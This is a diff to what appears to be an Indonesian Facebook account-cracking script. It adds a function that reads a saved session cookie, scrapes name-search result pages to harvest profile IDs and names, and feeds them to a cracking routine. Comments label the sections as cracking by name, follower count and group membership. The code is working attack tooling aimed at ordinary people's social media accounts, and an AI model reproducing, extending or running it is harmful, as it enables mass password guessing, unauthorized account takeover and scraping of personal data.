@@ -153,7 +153,7 @@ def menu():
 	elif romz in ['2']:
 		massal(token,coki)
 	elif romz in ['3']:
-		nama()
+		search_name(data_,jum)
 	elif romz in ['4']:
 		hasil()
 	elif romz in ['5']:
@@ -247,6 +247,31 @@ def massal(token,cookie):
 	return crack().__xnx__(id)
 	     
 # CRACK PENCARIAN NAMA
+def search_name(data_,jum):
+	try:
+		true = False
+		kontol = requests.get(data_,cookies=romz_xyz(open("data/cookie.txt","r").read().strip())).text
+		memek = re.findall('picture" \/>\<\/a\>\<\/td\>\<td\ class\=\"(.*?)\"\>\<a\ href\=\"\/(.*?)"\>\<div\ class\=\"..\"\>\<div\ class\=\"..\"\>(.*?)<\/div>',kontol)
+		for i in memek:
+			if "profile.php?" in i[1]:
+				id.append(re.findall("id=(.*?)&amp;refid",i[1])[0]+"<=>"+i[2])
+			else:
+				id.append(re.findall("(.*?)\?refid=",i[1])[0]+"<=>"+i[2])
+			sys.stdout.write(f'\r{p}╰─{o} mengumpulkan ID{m} >{h} {len(id)} '),
+			sys.stdout.flush();jeda(0.0050)
+			if len(id)==jum:
+				true=True
+				break
+		if true==False:
+			if "Lihat Hasil Selanjutnya" in kontol:
+				search_name(parser(kontol,"html.parser").find("a",string="Lihat Hasil Selanjutnya").get("href"),jum)
+	except:
+		pass
+	print("")
+	if len(id)!=0:
+		return Crack().romiy(id)
+	else:
+		exit('%s╰─%s gagal mengambil id'%(p,m))
 # CRACK JUMLAH FOLLOWER
 # CRACK ANGGOTA GROUP
 	       
